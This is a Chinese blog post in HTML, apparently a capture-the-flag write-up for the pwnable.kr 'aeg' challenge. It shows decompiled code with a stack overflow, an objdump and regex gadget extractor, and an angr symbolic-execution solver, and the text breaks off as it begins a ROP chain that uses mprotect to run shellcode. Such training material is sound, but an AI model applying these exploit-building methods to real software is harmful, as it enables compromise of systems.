@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zeredy879.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="pwnable.kr aeg题解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr aeg">
+<meta property="og:url" content="http://zeredy879.github.io/2024/04/04/aeg-pwnablekr/index.html">
+<meta property="og:site_name" content="Mirror of Glory">
+<meta property="og:description" content="pwnable.kr aeg题解">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zeredy879.github.io/2024/04/04/aeg-pwnablekr/klee.png">
+<meta property="og:image" content="http://zeredy879.github.io/2024/04/04/aeg-pwnablekr/cfg.png">
+<meta property="article:published_time" content="2024-04-04T03:45:09.000Z">
+<meta property="article:modified_time" content="2024-04-06T07:16:26.569Z">
+<meta property="article:author" content="zeredy879">
+<meta property="article:tag" content="pwnable.kr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zeredy879.github.io/2024/04/04/aeg-pwnablekr/klee.png">
+
+
+<link rel="canonical" href="http://zeredy879.github.io/2024/04/04/aeg-pwnablekr/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zeredy879.github.io/2024/04/04/aeg-pwnablekr/","path":"2024/04/04/aeg-pwnablekr/","title":"pwnable.kr aeg"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>pwnable.kr aeg | Mirror of Glory</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mirror of Glory</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">zeredy879</p>
+  <div class="site-description" itemprop="description">Each hour has its colour, but colour exists only where there is light</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zeredy879.github.io/2024/04/04/aeg-pwnablekr/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="zeredy879">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mirror of Glory">
+      <meta itemprop="description" content="Each hour has its colour, but colour exists only where there is light">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="pwnable.kr aeg | Mirror of Glory">
+      <meta itemprop="description" content="pwnable.kr aeg题解">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwnable.kr aeg
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-04-04 11:45:09" itemprop="dateCreated datePublished" datetime="2024-04-04T11:45:09+08:00">2024-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-04-06 15:16:26" itemprop="dateModified" datetime="2024-04-06T15:16:26+08:00">2024-04-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">pwnable.kr aeg题解</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>nc连上给了一个base64编码后的文件，解码后是一个gzip压缩文件，解压后得到amd64的ELF二进制。主函数差不多是这样：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_914999D(<span class="number">1LL</span>, <span class="number">2LL</span>, <span class="number">3LL</span>, <span class="number">4LL</span>, <span class="number">5LL</span>, <span class="number">6LL</span>);</span><br><span class="line">    srand(v4);</span><br><span class="line">    len = <span class="built_in">strlen</span>(a2[<span class="number">1</span>]) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( len &lt;= <span class="number">1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="number">0</span>;</span><br><span class="line">      v12 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">2</span> * len &gt; v13 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7[<span class="number">0</span>] = a2[<span class="number">1</span>][v13];</span><br><span class="line">        v7[<span class="number">1</span>] = a2[<span class="number">1</span>][v13 + <span class="number">1</span>];</span><br><span class="line">        v7[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        v5 = v12++;</span><br><span class="line">        __isoc99_sscanf(v7, <span class="string">&quot;%02x&quot;</span>, &amp;byte_934CFC0[v5]);</span><br><span class="line">        v13 += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v11 == <span class="number">0xD1</span> &amp;&amp; (_BYTE)v10 == <span class="number">0x8E</span> &amp;&amp; <span class="number">24</span> * (_BYTE)v10 + <span class="number">49</span> * (_BYTE)v11 - (_BYTE)v9 == <span class="number">76</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = v9++;</span><br><span class="line">          v11 = v6;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          byte_934CFC0[i] ^= <span class="number">0x87</span>u;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          byte_934CFC0[i] ^= <span class="number">0x18</span>u;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v11 == <span class="number">52</span> &amp;&amp; (_BYTE)v10 == <span class="number">0x8B</span> &amp;&amp; <span class="number">76</span> * (_BYTE)v10 + <span class="number">62</span> * (_BYTE)v11 - (_BYTE)v9 == <span class="number">73</span> )</span><br><span class="line">          v11 = v10 + v9;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v11 == <span class="number">0xDA</span> &amp;&amp; (_BYTE)v10 == <span class="number">118</span> &amp;&amp; <span class="number">91</span> * (_BYTE)v10 + <span class="number">37</span> * (_BYTE)v11 - (_BYTE)v9 == <span class="number">80</span> )</span><br><span class="line">          v10 = v11 - v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;payload encoded. let&#x27;s go!&quot;</span>);</span><br><span class="line">      sub_9149904(byte_934CFC0[<span class="number">0</span>], byte_934CFC1, byte_934CFC2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;end of program&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;payload length exceeds 1000byte&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;usage : ./aeg [hex encoded payload]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>byte_934CFC0</code>用来存放最终的用户输入，程序逻辑大致是：读入16进制编码的字节输入，然后将其解码至数组<code>byte_934CFC0</code>中，接着对这个数组做xor再套一层，然后放进函数<code>sub_9149904</code>中执行，<code>sub_9149904</code>中一共套了16层同样的逻辑，大致过程是对数组<code>byte_934CFC0</code>每三字节一组做比较，如果相等则进入下一层。16层比较之后最终会进入这样一个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">target</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;unk_934CFF0, len - <span class="number">48</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个明显的栈溢出漏洞。那么目的很明确了，我们需要让程序通过前面所有的嵌套逻辑到这一步然后getshell。checksec之后发现没开PIE和Canary：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec chal</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>解题思路分为两个部分，首先是构造输入令控制流走到最终导致栈溢出的函数，然后是构造ROP链getshell或ORW。符号执行是解决AEG类pwn的通用工具了（虽然现在逐渐成为时代的眼泪），picoCTF 2024的逆向还出了一道入门符号执行的逆向题。在解题之前，先来看看符号执行的定义以及其发展历史：</p>
+<blockquote>
+<p>符号执行（英语：symbolic execution）是一种计算机科学领域的程序分析技术，通过采用抽象的符号代替精确值作为程序输入变量，得出每个路径抽象的输出结果。这一技术在硬件、底层程序测试中有一定的应用，能够有效的发现程序中的漏洞。</p>
+</blockquote>
+<blockquote>
+<p>这一思想最初由IBM托马斯·J·华森研究中心的詹姆斯·C.金（James C. King） 于1976年6月在论文Symbolic Execution and Program Testing中提出，文中“解析程序的路径后，用符号模拟通过路径并获得输出”的方法如今被称为“经典符号执行”。由于20世纪80年代的研究追求分析的完备性，而大型程序的路径复杂，不可能完全遍历，符号执行这一研究领域遇冷。21世纪后，该领域研究有了新的进展：2006年，克里斯蒂安·卡达尔（Cristian Cadar）在论文中设计了一种“先进行符号执行，后根据符号执行结果生成测试用例”的“执行生成测试”技术，并随后将其发展为应用在GNU&#x2F;Linux内核错误检查中的KLEE；2007年，库希克·森（Koushik Sen）在当年的软件工程自动化（Automated Software Engineering）会议提出将符号执行和实际执行结合的“混合执行（Concolic testing）”方法；2009年，维塔利·奇波诺夫（Vitaly Chipounov）提出“选择性符号执行”方法，通过选择“对程序设计者有意义”的执行分支进行符号执行测试来提高对大型程序应用符号执行测试的可行性。</p>
+</blockquote>
+<p>我个人对符号执行的理解是，将每个CFG中的选择分支转换为变量之间的数值关系，这个变量可以是内存的一块区域、寄存器。在目前所有架构的CPU里，其实现条件跳转的逻辑都依赖于寄存器、内存等存储单位中的数值比较，最终反应到FLAGS register完成条件选择。</p>
+<p>使用符号执行解AEG类问题绕不开的一个工具就是<a target="_blank" rel="noopener" href="https://angr.io/">Angr</a>了，在Angr之前更广为人知的工具是<a target="_blank" rel="noopener" href="https://github.com/klee/klee">KLEE</a>，虽然现在谷歌关键词<code>klee</code>前面几页大概率只能翻到一个红色小女孩（这就是我们原神的<a target="_blank" rel="noopener" href="https://genshin-impact.fandom.com/wiki/Klee">可莉</a>呀，你们有没有这样的可莉呀^_^）。Angr在CTF中发挥稳定且更加可靠，有一个github repo记录了用Angr解题的模板即<a target="_blank" rel="noopener" href="https://github.com/jakespringer/angr_ctf">angr_ctf</a>，其他同期的符号执行引擎比如manticore、PySymEmu逐渐在符号执行的热潮褪去之后（差不多是18、19年）不再维护。让我们来问问可莉为什么用Angr来解题吧。</p>
+<img src="/2024/04/04/aeg-pwnablekr/klee.png" class="">
+
+<p>啊这，她说不知道。确定了使用的工具后，问题就剩下如何用以及怎样拿到我们希望的结果了，首先明确的一点是，我们最终的输入存放在内存<code>byte_934CFC0</code>的这一片区域，之后使用2个字节对其做循环xor编码，并且前48字节需要通过嵌套比较逻辑。main函数的逻辑有很恶心的一段：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v11 == <span class="number">0xD1</span> &amp;&amp; (_BYTE)v10 == <span class="number">0x8E</span> &amp;&amp; <span class="number">24</span> * (_BYTE)v10 + <span class="number">49</span> * (_BYTE)v11 - (_BYTE)v9 == <span class="number">76</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = v9++;</span><br><span class="line">          v11 = v6;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          byte_934CFC0[i] ^= <span class="number">0x87</span>u;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          byte_934CFC0[i] ^= <span class="number">0x18</span>u;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v11 == <span class="number">52</span> &amp;&amp; (_BYTE)v10 == <span class="number">0x8B</span> &amp;&amp; <span class="number">76</span> * (_BYTE)v10 + <span class="number">62</span> * (_BYTE)v11 - (_BYTE)v9 == <span class="number">73</span> )</span><br><span class="line">          v11 = v10 + v9;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v11 == <span class="number">0xDA</span> &amp;&amp; (_BYTE)v10 == <span class="number">118</span> &amp;&amp; <span class="number">91</span> * (_BYTE)v10 + <span class="number">37</span> * (_BYTE)v11 - (_BYTE)v9 == <span class="number">80</span> )</span><br><span class="line">          v10 = v11 - v9;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果符号执行的起点在这或者这之前开始，那么就会面临路径爆炸而不可能到达需要约束求解的位置。我们需要符号执行的起点从<code>puts(&quot;payload encoded. let&#39;s go!&quot;);</code>这一行开始，并且提取出用于异或的两个字节，这一行代码在CFG中的位置如下：</p>
+<img src="/2024/04/04/aeg-pwnablekr/cfg.png" class="">
+
+<p>可以看到下面紧跟着的就是路径爆炸地狱。我在网上找了一圈如何过滤出程序地址和一些重要的变量如用于xor的字节，得到了两个解决方案，分别是objdump + 正则表达式和radare2 API接口去完成，本着能不学就不学的原则我还是选择了前者：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">binary_parse</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    objdump = subprocess.check_output(<span class="string">f&#x27;objdump -d -M intel <span class="subst">&#123;path&#125;</span>&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    objdump = objdump.decode()</span><br><span class="line"></span><br><span class="line">    start_regex = hex_regex + <span class="string">&#x27;:.*&lt;puts@plt&gt;\n &#x27;</span> + hex_regex_match + <span class="string">&#x27;:&#x27;</span></span><br><span class="line">    start = re.findall(pattern=start_regex, string=objdump)</span><br><span class="line">    start = <span class="built_in">int</span>(start[<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    bin_info[<span class="string">&#x27;start&#x27;</span>] = start</span><br><span class="line"></span><br><span class="line">    target_regex = hex_regex_match + <span class="string">&#x27;:.*call.*&lt;memcpy@plt&gt;&#x27;</span></span><br><span class="line">    target = re.findall(pattern=target_regex, string=objdump)</span><br><span class="line">    target = <span class="built_in">int</span>(target[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    bin_info[<span class="string">&#x27;target&#x27;</span>] = target</span><br><span class="line"></span><br><span class="line">    buffer_addr_regex = <span class="string">&#x27;rdx,\[rax\+0x&#x27;</span> + hex_regex_match</span><br><span class="line">    buffer_addr = re.findall(pattern=buffer_addr_regex, string=objdump)</span><br><span class="line">    buffer_addr = <span class="built_in">int</span>(buffer_addr[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    bin_info[<span class="string">&#x27;buffer_addr&#x27;</span>] = buffer_addr</span><br><span class="line"></span><br><span class="line">    padding_regex = <span class="string">&#x27;sub.*rsp,0x&#x27;</span> + hex_regex_match</span><br><span class="line">    padding = re.findall(pattern=padding_regex, string=objdump)</span><br><span class="line">    padding = <span class="built_in">int</span>(padding[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    bin_info[<span class="string">&#x27;padding&#x27;</span>] = padding</span><br><span class="line"></span><br><span class="line">    xor_regex = <span class="string">&#x27;xor.*eax,0x&#x27;</span> + hex_regex_match</span><br><span class="line">    xors = re.findall(pattern=xor_regex, string=objdump)</span><br><span class="line">    xor0 = <span class="built_in">int</span>(xors[<span class="number">0</span>], <span class="number">16</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    xor1 = <span class="built_in">int</span>(xors[<span class="number">1</span>], <span class="number">16</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    bin_info[<span class="string">&#x27;xors&#x27;</span>] = <span class="built_in">int</span>.to_bytes(xor0) + <span class="built_in">int</span>.to_bytes(xor1)</span><br><span class="line"></span><br><span class="line">    rdx_gadget_regex = hex_regex_match + <span class="string">&#x27;:.*mov\s*rdx,QW.*\[rbp-0x&#x27;</span> + hex_regex_match</span><br><span class="line">    rdx_gadget = re.findall(pattern=rdx_gadget_regex, string=objdump)</span><br><span class="line">    rdx_gadget_addr = <span class="built_in">int</span>(rdx_gadget[<span class="number">0</span>][<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">    rdx_gadget_offset = <span class="built_in">int</span>(rdx_gadget[<span class="number">0</span>][<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    bin_info[<span class="string">&#x27;rdx_gadget_addr&#x27;</span>] = rdx_gadget_addr</span><br><span class="line">    bin_info[<span class="string">&#x27;rdx_gadget_offset&#x27;</span>] = rdx_gadget_offset</span><br></pre></td></tr></table></figure>
+
+<p>VSCode的正则表达式匹配立大功，基本上能很快的按图索骥得到需要的正则式。这里涉及了很多必要的变量，比如存放输入的内存地址，预期符号执行的起点和终点，给rdx赋值的ROPGadget以及rsp的无效填充偏移量，提取出必要的信息后就需要让angr发挥作用了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">angr_solver</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    proj = angr.Project(path)</span><br><span class="line">    init = proj.factory.blank_state(</span><br><span class="line">        addr=bin_info[<span class="string">&#x27;start&#x27;</span>],</span><br><span class="line">        add_options=&#123;</span><br><span class="line">            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line">    buffer = claripy.BVS(<span class="string">&#x27;buffer&#x27;</span>, <span class="number">48</span> * <span class="number">8</span>)</span><br><span class="line">    init.memory.store(bin_info[<span class="string">&#x27;buffer_addr&#x27;</span>], buffer)</span><br><span class="line">    simu = proj.factory.simgr(init)</span><br><span class="line">    simu.use_technique(angr.exploration_techniques.DFS())</span><br><span class="line">    simu.explore(find=bin_info[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> simu.found:</span><br><span class="line">        solution = simu.found[<span class="number">0</span>]</span><br><span class="line">        payload = solution.solver.<span class="built_in">eval</span>(buffer, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>写出来并不难，参照一下angr_ctf的模板以及将内存符号化就行。最后就是ROP链的构造了，这个过程涉及到栈迁移以及偏移量的计算，整个调试和设计栈的过程只能用折磨两个字形容。注意到plt表中是有mprotect的，所以也没必要ret2libc了，直接改内存权限为RWX就行，最后跳转到shellcode：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title 